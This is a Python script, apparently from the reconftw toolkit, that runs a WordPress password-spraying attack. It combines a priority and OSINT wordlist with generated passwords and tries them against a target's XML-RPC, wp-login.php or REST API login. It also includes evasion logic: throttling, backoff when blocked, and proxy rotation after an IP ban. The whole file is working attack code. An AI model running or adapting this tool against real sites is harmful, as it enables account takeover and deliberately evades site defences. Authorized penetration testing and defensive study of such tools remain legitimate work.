#!/usr/bin/env python3
"""WordPress spray: priority wordlist (short + osint) then wp-brute-pro smart generation."""
import argparse
import json
import os
import sys
import urllib3

urllib3.disable_warnings()


def parse_args():
    p = argparse.ArgumentParser(description="WP hybrid spray (reconftw)")
    p.add_argument("-u", "--url", required=True, help="Target WordPress URL")
    p.add_argument("-U", "--users", required=True, help="Usernames (comma separated)")
    p.add_argument("--priority-wordlist", required=True, help="Short list + osint passwords (tried first)")
    p.add_argument("--scan-json", help="Prior recon JSON (method auto + login URL)")
    p.add_argument("--method", default="auto", choices=["auto", "xmlrpc", "wplogin", "restapi"])
    p.add_argument("--batch-size", type=int, default=50)
    p.add_argument("--delay", type=float, default=3.0)
    p.add_argument("--max-passwords", type=int, default=0, help="0 = unlimited")
    p.add_argument("--company", help="Company name for wp-brute-pro generator")
    p.add_argument("--keywords", help="Extra keywords for generator")
    p.add_argument("--crawl", action="store_true", help="Crawl target for generator keywords")
    p.add_argument("--output", required=True, help="Output directory")
    p.add_argument("--tool-root", help="wp-brute-pro install path")
    p.add_argument("--proxy-list", help="Proxy list file")
    p.add_argument("--export-json", help="Export results JSON path")
    p.add_argument("--resume", action="store_true")
    return p.parse_args()


def load_lines(path):
    passwords = []
    if not path or not os.path.isfile(path):
        return passwords
    with open(path, "r", encoding="utf-8", errors="ignore") as handle:
        for line in handle:
            pwd = line.strip()
            if pwd and 3 <= len(pwd) <= 64:
                passwords.append(pwd)
    return passwords


def merge_password_lists(priority, generated, max_passwords):
    merged = []
    seen = set()
    for pwd in priority + generated:
        if pwd in seen:
            continue
        seen.add(pwd)
        merged.append(pwd)
        if max_passwords > 0 and len(merged) >= max_passwords:
            break
    return merged


def pick_method(method, scan_info):
    if method != "auto":
        return method
    if scan_info and scan_info.get("xmlrpc_active"):
        return "xmlrpc"
    if scan_info and scan_info.get("login_url"):
        return "wplogin"
    return "restapi"


def main():
    args = parse_args()
    tool_root = args.tool_root or os.environ.get("WP_BRUTE_TOOL_ROOT", "")
    if not tool_root or not os.path.isdir(tool_root):
        print("wp-brute-pro tool root missing (--tool-root or WP_BRUTE_TOOL_ROOT)", file=sys.stderr)
        return 2

    sys.path.insert(0, tool_root)
    from wordlist.generator import generate
    from core.xmlrpc import XmlRpcAttack
    from core.wplogin import WpLoginAttack
    from core.restapi import RestApiAttack
    from core.validator import Validator
    from evasion.throttle import Throttle
    from evasion.proxy import ProxyRotator
    from state.tracker import Tracker
    from output.reporter import Reporter

    url = args.url.rstrip("/")
    usernames = [u.strip() for u in args.users.split(",") if u.strip()]
    if not usernames:
        print("No usernames provided", file=sys.stderr)
        return 2

    if not os.path.isfile(args.priority_wordlist):
        print(f"Priority wordlist not found: {args.priority_wordlist}", file=sys.stderr)
        return 2

    scan_info = None
    if args.scan_json and os.path.isfile(args.scan_json):
        with open(args.scan_json, "r", encoding="utf-8") as handle:
            scan_info = json.load(handle)

    priority = load_lines(args.priority_wordlist)
    generated = generate(
        usernames=usernames,
        company=args.company or None,
        keywords=args.keywords,
        crawl_url=url if args.crawl else None,
        extra_wordlist=None,
    )
    passwords = merge_password_lists(priority, generated, args.max_passwords)
    if not passwords:
        print("No passwords to try", file=sys.stderr)
        return 2

    method = pick_method(args.method, scan_info)
    if scan_info and scan_info.get("has_captcha") and method == "wplogin" and scan_info.get("xmlrpc_active"):
        method = "xmlrpc"

    out_dir = args.output
    os.makedirs(out_dir, exist_ok=True)
    reporter = Reporter(out_dir)
    tracker = Tracker(out_dir)
    throttle = Throttle(args.delay, args.batch_size)
    validator = Validator(url)
    proxy_rotator = ProxyRotator(proxy_file=args.proxy_list)

    tracker.set_target(url)
    tracker.set_generated(len(passwords))
    reporter.info(
        f"Hybrid spray: {len(priority)} priority + {len(generated)} smart-generated "
        f"= {len(passwords)} unique, method={method}, users={','.join(usernames)}"
    )

    for username in usernames:
        todo = tracker.filter_new(username, passwords) if args.resume else passwords
        if not todo:
            reporter.info(f"[{username}] already complete (resume)")
            continue

        reporter.info(f"[{username}] trying {len(todo)} password(s)")
        found = False

        if method == "xmlrpc":
            attacker = XmlRpcAttack(url)
            user_tried = 0
            for start in range(0, len(todo), throttle.batch_size):
                batch = todo[start:start + throttle.batch_size]
                status_code, resp_text = attacker.send_batch(username, batch, proxies=proxy_rotator.get_current())

                if status_code == 200:
                    throttle.success()
                    candidate = attacker.parse_response(resp_text, batch)
                    if candidate and validator.verify(username, candidate):
                        reporter.found(username, candidate)
                        tracker.mark_found(username, candidate)
                        found = True
                        break
                    user_tried += len(batch)
                elif status_code in (403, 429, 503):
                    penalty = throttle.blocked(status_code)
                    reporter.warning(f"HTTP {status_code} — waiting {penalty}s")
                    if throttle.is_banned():
                        if proxy_rotator.has_proxies() and proxy_rotator.rotate():
                            throttle.mark_ban()
                            continue
                        reporter.error("IP banned and no proxies left")
                        break
                    throttle.wait_penalty(penalty)
                    throttle.mark_ban()
                elif status_code < 0:
                    penalty = throttle.timeout()
                    reporter.warning(f"Connection error — waiting {penalty}s")
                    throttle.wait_penalty(penalty)
                    throttle.mark_ban()
                else:
                    user_tried += len(batch)

                tracker.mark_tried(username, batch)
                tracker.update_user(username, user_tried)
                throttle.wait()

            tracker.update_user(username, user_tried, "found" if found else "done")

        else:
            login_url = (scan_info or {}).get("login_url") or f"{url}/wp-login.php"
            attacker = WpLoginAttack(login_url) if method == "wplogin" else RestApiAttack(url)
            tried = 0
            for pwd in todo:
                result = attacker.try_login(username, pwd)
                tried += 1
                if result is True and validator.verify(username, pwd):
                    reporter.found(username, pwd)
                    tracker.mark_found(username, pwd)
                    found = True
                    break
                tracker.mark_tried(username, [pwd])
                throttle.wait()
            tracker.update_user(username, tried, "found" if found else "done")

        if found:
            break

    tracker.save_state()
    reporter.write_report(scan_info, tracker.state, throttle.stats())

    if args.export_json:
        export = {
            "target": url,
            "scan": scan_info,
            "results": tracker.state,
            "throttle": throttle.stats(),
            "mode": "hybrid",
            "priority_count": len(priority),
            "generated_count": len(generated),
            "total_unique": len(passwords),
        }
        with open(args.export_json, "w", encoding="utf-8") as handle:
            json.dump(export, handle, indent=2, ensure_ascii=False)

    return 0


if __name__ == "__main__":
    sys.exit(main())
